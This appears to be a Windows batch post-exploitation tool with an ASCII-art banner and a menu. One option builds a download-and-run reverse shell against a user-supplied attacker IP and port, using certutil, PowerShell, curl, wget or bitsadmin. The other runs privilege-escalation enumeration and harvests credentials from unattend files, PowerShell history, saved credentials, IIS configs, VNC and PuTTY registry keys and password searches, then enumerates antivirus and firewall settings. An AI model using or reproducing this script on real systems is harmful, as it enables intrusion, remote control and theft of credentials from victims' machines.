@echo off
setlocal EnableExtensions
setlocal EnableDelayedExpansion
echo.                                                              
echo.                                                              
echo.                                                              
echo.                      ----..-------                           
echo.                  ---------..--------+                        
echo.                +-.--------..-------.-+-                      
echo.             #-..--------...---------.+--                     
echo.            +-.----------....--------.-+..   +------          
echo.           +-..----------....---+----.-+-.-+ +------          
echo.           -..----++++++-....-+++---+-.-+-.-++------          
echo.           ...---------+-....++++---++..++-.-------+          
echo.           ..-++++-+++++....-++++-..++-.+++------++           
echo.          -..--------+++.....+++++...+-.-+++++---             
echo.          -----+###+#####+++++++++-----+-++++++++             
echo.          ---++++++++++---------+####..-------+##             
echo.       --+###+++++++-----------.+####+.--------------+++      
echo.   +++#######++++++++--+###..---.-++-.----++----+----+++---+# 
echo.  #########+#+++-++++-#####+.--------+++++-----#######++------
echo.  +#######++++++-++++-.####..+-+-+++++++------+##########+----
echo. #++++++##+++++++++++++-...-++++++++++--++-+++#############+--
echo. #++++++#####+++++++++++++++++++++++++++++++###############++-
echo.  -+++++###  +++++++++++++###++++++++++++++#############+++###
echo.                +++++++++++++++++++++++++++###################
echo.                 +++++++++++###########++++###################
echo.                +---++++++#########+++++######################
echo.           ####+-+#+++++++++++##++++++####################### 
echo.        #++-+##+--+##+++++++++++++++++########################
echo.       -----+##++++++++++++#++++++++##########################
echo.       -----++------++++++######+#############################
echo.      #--+++-----++###########################################
echo.      #++#+-------++##########################################
echo.      ###+------+#############################################
echo.      +#+-----############################################++++

setlocal
:main
echo. What would you like to do?
echo. 1. Setup reverse shell
echo. 2. PrivEsc
echo. 3. Exit
set /P choice=

if !choice! equ 1 (
call :revshell
)

if !choice! equ 2 (
CALL :privesc
)

if !choice! equ 3 (
    exit /B
)

:revshell
echo. Enter attacker IP:
set /P IP=
echo. Enter attacker port:
set /P PORT=
echo. Enter url to download revshell. Avoid having more than one slash in the url, might break regex:
set /P exeurl=
FOR /F "tokens=*" %%g IN ('echo. !exeurl:~6!^|findstr /R "^[a-z]+.[a-z]+$"') do (SET outfile=%%g)
echo. !outfile!
@rem ((certutil.exe -urlcache -f !exeurl! !outfile! || (Invoke-WebRequest !exeurl! -OutFile !outfile! | powershell.exe) || (New-Object Net.WebClient).DownloadFile(!exeurl!,!outfile!) | powershell.exe || wget.exe !exeurl! -OutFile !outfile! || curl.exe -o  !exeurl! !outfile! || bitsadmin /transfer myDownloadJob /download /priority normal !exeurl! !outfile!) && (!outfile! !IP! !PORT! !meterpreter! || powershell.exe -ep bypass -c "./!outfile! !IP! !PORT!" || cscript !outfile! !IP! !PORT!)) ||  echo. lmaoxd
CALL :main

:privesc
echo. --------------Gathering system information----------------
echo.
echo. Hostname
hostname
echo. General system information. Generating systeminfo.txt for Windows Exploit Suggester:
systeminfo && systeminfo > systeminfo.txt
if %errorlevel% neq 0 (
    echo. Could not write systeminfo.txt
)
echo. Gathering patches and/or hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn
echo. Check for other disks
wmic logicaldisk get Caption, Description

echo. -------------Gathering user information-----------------
echo.
echo. Current user
whoami
echo. Privileges of current user
whoami /priv
echo. Group membership of current user
whoami /groups
echo. Local users on system
net user
echo. Local groups on system
net localgroup
echo. Domain groups
net group /domain

echo. -------------Gathering network information-----------------
echo.
echo. Network configuration
ipconfig /all
echo. Get ARP table
arp -a
echo. Print routing information
route print
echo. Get active connections
netstat -ano

echo. -------------Credential harvesting-------------------
echo.
echo. Look for credentials remaining from autounattended setup
for %%a in ("c:\sysprep\sysprep.xml" "C:\sysprep.inf" "C:\Unattend.xml" "%WINDIR%\Panther\Unattend.xml" "%WINDIR%\Panther\Unattend\Unattend.xml" "%WINDIR%\system32\sysprep.inf" "%WINDIR%\system32\sysprep\sysprep.xml") do (
    type %%a | (findstr /i username && findstr /i password)
)
echo. Checking Powershell command history for credentials
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
echo. Checking saved credentials
cmdkey /list | findstr /i password
@rem runas /savecred /user:admin cmd.exe
echo. Checking IIS config for credentials
for %%a in ("C:\inetpub\wwwroot\web.config" "%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\Config\web.config" ) do (
    type %%a | (findstr /i username && findstr /i password)
)
echo. Looking for credentials in software configuration files
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
echo. Look for credentials in registry keys
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
echo. Do you want to search files for credentials?
set /p ans=
if /i ans eq "yes" (
    dir /s *pass* == *cred* == *vnc* == *.config*
    findstr /spi "password" *.*
)

echo. -------------AV and Firewall Enumeration-------------------
echo.
sc query windefend
netsh advfirewall firewall dump
netsh firewall show state && netsh firewall show configuration

echo. -------------Services and Tasks-------------------
echo.
sc queryex type= service
schtasks /query /fo list /v

goto :main
endlocal